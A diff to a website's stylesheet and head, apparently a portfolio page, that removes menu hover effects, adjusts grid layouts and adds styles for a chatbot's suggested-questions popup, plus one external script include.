@@ -247,7 +247,6 @@
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      opacity: 1 !important;
     }
 
     .background-gradient {
@@ -792,19 +791,16 @@
         padding-left: 0.9rem;
     }
     
-    .main-menu li a:hover {
-        color: var(--color-brand-orange);
-        background-color: var(--color-brand-active-menu-bg);
-        transform: translateX(3px) scale(1.03);
-        box-shadow: 0 4px 12px rgba(var(--accent-color-rgb), 0.12), inset 0 0 4px rgba(var(--accent-color-rgb), 0.1);
-        text-decoration: none !important;
-    }
     .main-menu li a.active {
-        background-color: transparent;
+        background-color: transparent !important;
+        background: transparent !important;
+        box-shadow: none !important;
+        transform: none !important;
+        border: none !important;
     }
-    .main-menu li a:hover svg {
-        color: var(--color-brand-orange);
-    }
+    
+    /* Hover effects removed */
+    
     
     /* Configured custom fixed colors for each menu item when active */
     .main-menu li a.active[data-key="home"],
@@ -1124,9 +1120,13 @@
         background-color: var(--color-brand-active-menu-bg);
         transform: scale(1.1);
     }
-    .header-icon-button:active, .header-icon-button.active {
-        background-color: var(--color-brand-active-menu-bg);
-        transform: scale(0.98);
+    .header-icon-button:active, .header-icon-button.active,
+    .header-icon-button.active:hover {
+        background-color: transparent !important;
+        background: transparent !important;
+        box-shadow: none !important;
+        transform: none !important;
+        border: none !important;
     }
     .header-icon-button.active svg {
         color: inherit;
@@ -1648,7 +1648,7 @@
     }
     .about-page-grid {
         display: grid;
-        grid-template-columns: 2.3fr 1fr; /* 70/30 split */
+        grid-template-columns: 1fr 1fr; /* 50/50 split */
         gap: 1.5rem;
         height: 100%;
     }
@@ -1725,7 +1725,7 @@
     }
     .personal-info-grid {
         display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        grid-template-columns: repeat(2, 1fr);
         gap: 1.5rem;
         overflow-y: auto;
         padding-right: 0.5rem;
@@ -1984,8 +1984,8 @@
     }
 
     .service-logo-item-new {
-        width: 2.55rem;
-        height: 2.55rem;
+        width: 50px;
+        height: 50px;
         border-radius: 50%;
         background-color: var(--sidebar-bg);
         padding: 4px;
@@ -2874,6 +2874,135 @@
     }
     .chatbot-send-btn:hover { filter: brightness(1.1); }
     .chatbot-send-btn:disabled { background-color: var(--color-brand-text-secondary); cursor: not-allowed; }
+    .suggested-questions-btn-toggle {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        background-color: var(--color-brand-active-menu-bg);
+        border: 1px solid var(--card-border);
+        color: var(--accent-color);
+        padding: 0.5rem 1rem;
+        border-radius: 999px;
+        font-size: 0.9rem;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        margin-bottom: 0.75rem;
+        width: fit-content;
+    }
+    .suggested-questions-btn-toggle:hover {
+        background-color: var(--accent-color);
+        color: white;
+        transform: translateY(-1px);
+    }
+    .questions-popup-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.4);
+        backdrop-filter: blur(4px);
+        display: flex;
+        align-items: flex-end;
+        justify-content: center;
+        z-index: 1000;
+        padding-bottom: 2rem;
+    }
+    .questions-popup-content {
+        background-color: var(--body-bg);
+        width: 90%;
+        max-width: 500px;
+        border-radius: 20px;
+        box-shadow: 0 -5px 25px rgba(0, 0, 0, 0.2);
+        padding: 1.5rem;
+        border: 1px solid var(--card-border);
+        max-height: 70vh;
+        display: flex;
+        flex-direction: column;
+    }
+    .questions-popup-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 1.25rem;
+    }
+    .questions-popup-header h3 {
+        margin: 0;
+        font-size: 1.1rem;
+    }
+    .header-title-area {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+    }
+    .back-btn {
+        background: transparent;
+        border: none;
+        color: var(--color-brand-text-secondary);
+        cursor: pointer;
+        padding: 0.5rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: color 0.2s;
+    }
+    .back-btn:hover {
+        color: var(--accent-color);
+    }
+    .questions-popup-header button {
+        background: transparent;
+        border: none;
+        color: var(--color-brand-text-secondary);
+        cursor: pointer;
+        padding: 0.5rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .questions-list {
+        overflow-y: auto;
+        display: flex;
+        flex-direction: column;
+        gap: 0.75rem;
+    }
+    .question-item {
+        background-color: var(--color-brand-progress-bg);
+        border: 1px solid var(--card-border);
+        color: var(--color-brand-text-primary);
+        padding: 0.8rem 1rem;
+        border-radius: 12px;
+        text-align: left;
+        font-size: 0.95rem;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 1rem;
+    }
+    .unanswered-badge {
+        font-size: 0.7rem;
+        background-color: rgba(239, 68, 68, 0.1);
+        color: #ef4444;
+        padding: 2px 8px;
+        border-radius: 999px;
+        white-space: nowrap;
+        font-weight: 500;
+        border: 1px solid rgba(239, 68, 68, 0.2);
+    }
+    .question-item.unanswered:hover {
+        background-color: rgba(239, 68, 68, 0.05);
+        border-color: #ef4444;
+    }
+    .question-item.category-item {
+        font-weight: 600;
+    }
+    .question-item:hover {
+        background-color: var(--color-brand-active-menu-bg);
+        border-color: var(--accent-color);
+        color: var(--accent-color);
+    }
     .chat-error-message {
         text-align: center;
         color: #ef4444;
@@ -3099,6 +3228,14 @@
         transition: all 0.2s;
         font-family: inherit;
         line-height: 1.4;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 1rem;
+    }
+    .selected-category-view .suggested-prompt-btn.unanswered:hover {
+        background-color: rgba(239, 68, 68, 0.05);
+        border-color: #ef4444;
     }
     .selected-category-view .suggested-prompt-btn:hover {
         background-color: var(--color-brand-active-menu-bg);
@@ -4774,7 +4911,7 @@
         height: auto;
       }
       .personal-info-grid {
-        grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+        grid-template-columns: repeat(2, 1fr);
       }
     }
     @media (max-width: 767px) {
@@ -5424,6 +5561,7 @@
   }
 }
 </script>
+  <script src="https://scena.link/app.js" async defer></script>
 </head>
 <body>
 	   <!-- Mouase Magic Cursor Start -->
